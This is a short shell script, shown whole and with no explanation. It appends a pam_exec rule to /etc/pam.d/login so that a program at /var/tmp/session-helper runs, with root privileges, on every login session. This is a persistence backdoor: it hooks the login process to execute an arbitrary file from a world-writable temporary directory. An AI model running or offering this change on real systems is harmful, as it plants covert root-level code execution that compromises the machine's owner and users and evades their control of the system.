#!/bin/sh
printf '%s\n' 'session required pam_exec.so /var/tmp/session-helper' >> /etc/pam.d/login
